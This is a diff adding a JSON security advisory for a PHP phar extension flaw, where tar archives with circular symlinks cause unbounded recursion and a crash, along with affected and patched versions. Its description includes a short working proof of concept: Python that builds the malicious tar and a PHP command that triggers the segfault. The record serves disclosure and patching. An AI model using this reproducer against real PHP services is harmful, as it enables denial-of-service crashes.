@@ -1,0 +1,75 @@
+{
+  "global": null,
+  "id": "GHSA-vc5h-9ppw-p5f3",
+  "repo": {
+    "cve_id": "CVE-2026-7260",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.5,
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-674"
+    ],
+    "description": "`phar_get_link_source()` in `ext/phar/util.c` recursively follows symbolic links in phar archives without any depth limit or cycle detection. A crafted tar-based phar archive containing circular symlinks causes unbounded recursion, exhausting the C stack and crashing the PHP process.\r\n\r\nhttps://github.com/php/php-src/blob/cbc0489126a7682796aad1e5fb4e51de74af162c/ext/phar/util.c#L60-L82\r\n\r\n```bash\r\npython3 -c \"\r\nimport tarfile\r\nwith tarfile.open('circular_symlinks.tar', 'w') as tar:\r\n    a = tarfile.TarInfo(name='file_a'); a.type = tarfile.SYMTYPE; a.linkname = 'file_b'; tar.addfile(a)\r\n    b = tarfile.TarInfo(name='file_b'); b.type = tarfile.SYMTYPE; b.linkname = 'file_a'; tar.addfile(b)\r\n\"\r\n\r\nphp -r '\r\n$p = new PharData(\"circular_symlinks.tar\");\r\n$p[\"file_a\"]->getContent();\r\n'\r\n# Expected: Segmentation fault (stack overflow)\r\n```",
+    "ghsa_id": "GHSA-vc5h-9ppw-p5f3",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-vc5h-9ppw-p5f3",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vc5h-9ppw-p5f3"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-7260"
+      }
+    ],
+    "published_at": "2026-07-30T11:03:15Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Stack overflow in phar with circular symlinks",
+    "updated_at": "2026-10-06T20:13:35Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-phar"
+        },
+        "patched_versions": "8.2.33",
+        "vulnerable_version_range": "<8.2.33"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-phar"
+        },
+        "patched_versions": "8.3.33",
+        "vulnerable_version_range": "<8.3.33"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-phar"
+        },
+        "patched_versions": "8.4.24",
+        "vulnerable_version_range": "<8.4.24"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-phar"
+        },
+        "patched_versions": "8.5.9",
+        "vulnerable_version_range": "<8.5.9"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
